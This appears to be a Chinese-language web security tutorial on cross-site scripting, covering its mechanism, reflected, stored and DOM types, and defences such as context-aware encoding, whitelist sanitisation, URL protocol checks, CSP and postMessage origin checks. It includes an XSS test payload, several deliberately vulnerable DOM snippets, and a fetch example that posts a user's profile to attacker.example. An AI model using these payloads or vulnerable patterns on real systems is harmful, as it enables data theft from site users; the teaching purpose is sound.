## 攻击原理

XSS（Cross-Site Scripting）指攻击者把可执行脚本注入到正常页面里，让浏览器把它当成网站自己的代码执行。问题的关键不是“输入里有特殊字符”，而是“不可信内容被当成了可执行内容”。

```html
<div id="msg"></div>
<script>
  const name = new URLSearchParams(location.search).get("name");
  document.querySelector("#msg").innerHTML = name;
</script>
```

如果 `name` 是 `<img src=x onerror=alert(1)>`，页面就会执行恶意脚本。最常见的诱因是把 URL 参数、表单输入、接口返回、评论内容、富文本内容直接放进 `innerHTML`、模板拼接或不安全的插值位置。

XSS 的危险在于脚本一旦以站点身份运行，就能读取页面状态、调用接口、修改 DOM、劫持跳转、发起恶意请求，甚至进一步窃取令牌或诱导用户操作。它不是“弹个 alert”的小问题，`alert(1)` 只是用来证明代码执行了。

攻击脚本的权限来自浏览器的同源模型。只要脚本运行在当前站点上下文里，它就能访问同源页面暴露给 JavaScript 的数据，例如 DOM、非 `HttpOnly` Cookie、`localStorage`、`sessionStorage`、页面内存里的 token，以及同源接口响应。也就是说，XSS 的破坏范围取决于页面把多少敏感能力暴露给脚本。

```js
fetch("/api/me")
  .then((response) => response.json())
  .then((user) => {
    return fetch("https://attacker.example/collect", {
      method: "POST",
      body: JSON.stringify(user),
    });
  });
```

即使 Cookie 设置了 `HttpOnly`，脚本不能直接读取 Cookie，也仍然可能借助用户登录态调用同源接口。所以 `HttpOnly` 是降低令牌被盗风险，不是让 XSS 变得无害。

## 典型类型

XSS 一般分成反射型、存储型和 DOM 型三类。

| 类型 | 触发位置 | 特点 |
| --- | --- | --- |
| 反射型 | 请求进入页面时 | 依赖诱导点击，常见于搜索页、跳转页 |
| 存储型 | 数据先落库再展示 | 影响面大，常见于评论、帖子、客服系统 |
| DOM 型 | 浏览器脚本处理阶段 | 代码在前端发生，常见于单页应用 |

反射型和存储型通常与后端模板或接口输出有关，DOM 型则更多出现在前端直接操作 DOM 的地方。无论哪一种，本质都是“输出到了错误的上下文里”。

区分类型的意义在于定位修复点。反射型要看请求参数如何回显，存储型要看入库和展示链路，DOM 型要看前端代码是否把不可信数据送进危险 API。只在输入处拦截特殊字符通常不够，因为真正决定风险的是输出上下文。

现代前端还要关注“二次注入”。有些数据第一次展示时是安全的，但被存入本地缓存、富文本草稿、埋点字段或 URL hash 后，第二次被别的页面当成 HTML 使用，风险才真正触发。排查存储型 XSS 时，不要只看数据库，也要看 `localStorage`、IndexedDB、消息队列、CMS 配置和运营后台。

```js
localStorage.setItem("welcome", new URLSearchParams(location.search).get("text") ?? "");

const welcome = localStorage.getItem("welcome");
document.querySelector("#welcome").innerHTML = welcome;
```

这段代码的输入来自 URL，但触发点来自本地存储读取。修复时应该改输出方式，而不是只在写入存储时做一次不完整过滤。

## 防护链路

XSS 的防护不能只靠一种手段，通常要把输出编码、输入净化和浏览器策略一起用。

```text
不可信输入 -> 服务端/客户端校验 -> 上下文输出编码 -> 安全渲染 -> CSP 兜底
```

HTML 文本节点、属性值、URL、JavaScript 字符串、CSS 上下文，编码规则都不一样。也就是说，“转义一下”不是通用答案，必须看落点。

例如同样是用户昵称，放进 `<div>` 文本节点时需要 HTML 编码；放进 `href` 时还要校验协议；放进脚本字符串时又涉及 JavaScript 字符串转义。安全处理一定要跟着最终落点走，而不是跟着数据来源走。

常见输出上下文可以这样理解：

| 输出位置 | 主要风险 | 更安全的处理 |
| --- | --- | --- |
| HTML 文本节点 | 标签被解析 | 使用框架插值或 `textContent` |
| HTML 属性 | 事件属性、引号逃逸 | 属性编码，避免拼接事件属性 |
| URL 属性 | `javascript:`、恶意跳转 | 协议白名单和 URL 解析 |
| JavaScript 字符串 | 字符串逃逸执行脚本 | 避免把用户数据拼进脚本 |
| CSS 上下文 | 样式注入、历史兼容风险 | 避免用户控制完整 CSS |

这里最容易被低估的是 URL。`href`、`src`、`form action`、重定向参数都应该做协议和来源校验。只做 HTML 转义，不能阻止 `javascript:` 这类协议型风险。

## 安全渲染

如果内容只是普通文本，优先让框架自动转义。

```tsx
function Profile({ name }: { name: string }) {
  return <div>Hello, {name}</div>;
}
```

React、Vue 这类框架默认会对文本插值做转义，这也是它们在默认状态下比手写 DOM 字符串更安全的原因。只有在确实要渲染富文本时，才考虑白名单净化。

框架转义保护的是“文本插值”，不是所有绑定。比如 React 里 `<a href={url}>` 不会把恶意协议自动变成安全 URL；Vue 里动态绑定 `:href` 也一样。URL 是否可信、是否允许跳出当前站点，仍然要业务代码判断。

```tsx
function SafeLink({ href, children }: { href: string; children: React.ReactNode }) {
  const url = new URL(href, location.origin);

  if (!["http:", "https:"].includes(url.protocol)) {
    return <span>{children}</span>;
  }

  return <a href={url.toString()}>{children}</a>;
}
```

如果只允许站内跳转，还要判断 `url.origin === location.origin`。开放重定向和 XSS 经常互相放大：一个看似普通的跳转参数，可能把用户带到钓鱼页，或者绕过某些来源判断。

框架默认转义只保护普通插值，不保护显式危险入口。React 的 `dangerouslySetInnerHTML`、Vue 的 `v-html`、手写 `innerHTML` 都是在绕过默认保护。使用这些入口时，代码评审应当默认追问：内容来源是谁，是否净化，允许哪些标签和属性。

```html
<div id="article"></div>
<script>
  const html = sanitize(userHtml);
  document.querySelector("#article").innerHTML = html;
</script>
```

这里的关键不是“用了 `innerHTML` 就一定危险”，而是 `innerHTML` 接收的内容必须先经过可信净化。净化函数本身也要维护白名单，否则只是把风险从一处搬到另一处。

富文本净化通常采用白名单模型：允许有限标签、有限属性、有限 URL 协议，其他全部丢弃。黑名单模型很容易漏掉浏览器兼容语法、SVG、事件属性、`srcdoc` 等边角入口。

富文本净化要在“保存前”和“展示前”的取舍上做明确决策。保存前净化可以减少污染数据进入系统，但策略升级后历史数据可能已经被改写；展示前净化可以根据最新策略处理旧数据，但每次渲染都有成本。高风险业务通常两边都做：入库前先粗过滤，展示时再按当前白名单净化。

```js
const allowedTags = ["p", "strong", "em", "a", "ul", "ol", "li", "code", "pre"];
const allowedAttributes = {
  a: ["href", "title", "target", "rel"],
};
```

允许链接时，要自动补 `rel="noopener noreferrer"`，并限制协议为 `http:`、`https:`、`mailto:` 等明确集合。SVG、MathML、内联事件、`style` 属性、`iframe srcdoc` 都应该默认禁止，除非业务有非常强的理由。

## DOM 风险

前端里最危险的几个位置通常是：

```js
el.innerHTML = userInput;
el.insertAdjacentHTML("beforeend", userInput);
document.write(userInput);
location.href = userInput;
```

这些 API 都不是不能用，而是必须明确输入来源和上下文。和 [[1.6.3 CSP|CSP]] 配合时，`script-src` 的限制、`nonce`、`hash`、`unsafe-inline` 的取舍，都会直接影响 XSS 的可利用性。

DOM 型 XSS 在单页应用里尤其常见，因为很多数据不经过服务端模板，直接由浏览器解析 URL、hash、localStorage 或接口结果后渲染。排查时要重点搜索 `innerHTML`、`outerHTML`、`insertAdjacentHTML`、`eval`、`new Function`、动态 `script` 和不受控跳转。

动态执行代码的入口尤其要敏感：

```js
setTimeout(userInput, 1000);
new Function(userInput)();
element.setAttribute("onclick", userInput);
```

这些写法会把字符串当成代码执行，安全风险远高于普通 DOM 更新。业务里如果确实需要表达“规则”“公式”“模板”，应该使用受限 DSL、白名单解析器或服务端预编译，而不是把用户输入直接交给 JavaScript 引擎。

还有一种容易忽略的 DOM XSS 来自 `postMessage`。跨窗口消息必须校验 `origin` 和消息结构，不能收到什么就渲染什么。

```js
window.addEventListener("message", (event) => {
  if (event.origin !== "https://trusted.example") {
    return;
  }

  if (typeof event.data !== "string") {
    return;
  }

  document.querySelector("#message").textContent = event.data;
});
```

## 防护重点

| 场景 | 推荐做法 |
| --- | --- |
| 普通文本展示 | 交给框架默认转义 |
| 富文本展示 | 白名单净化后再渲染 |
| URL 参数回显 | 编码后输出到文本节点 |
| 动态脚本注入 | 尽量避免，必要时用 `nonce` / `hash` |
| 第三方脚本 | 限制来源，配合 CSP |

XSS 的真正防线不是“别让用户输入”，而是让不可信输入永远停留在数据层，不进入可执行上下文。

落地时可以按三步检查：第一，数据进入系统时只做格式和长度校验，不把它误认为可信；第二，输出时根据上下文编码或净化；第三，用 CSP、Cookie `HttpOnly`、权限最小化降低脚本执行后的破坏面。三步缺任何一步，都会让防线变薄。

代码审查时，可以把 XSS 风险集中到几个问题上：是否存在字符串拼 HTML，是否存在动态脚本执行，是否把 URL 当成普通字符串，是否渲染富文本，是否把外部数据存入本地后再次渲染。只要命中其中一个，就应该追踪完整数据流。

```js
function renderComment(comment) {
  const item = document.createElement("li");
  item.textContent = comment.content;
  return item;
}
```

安全写法通常并不复杂，只是需要默认把外部内容当作数据处理。越靠近 DOM 写入点，越要明确“这里是文本、URL、HTML，还是代码”。大部分 XSS 都不是因为团队不知道安全概念，而是因为某一次为了方便，把数据放进了错误上下文。
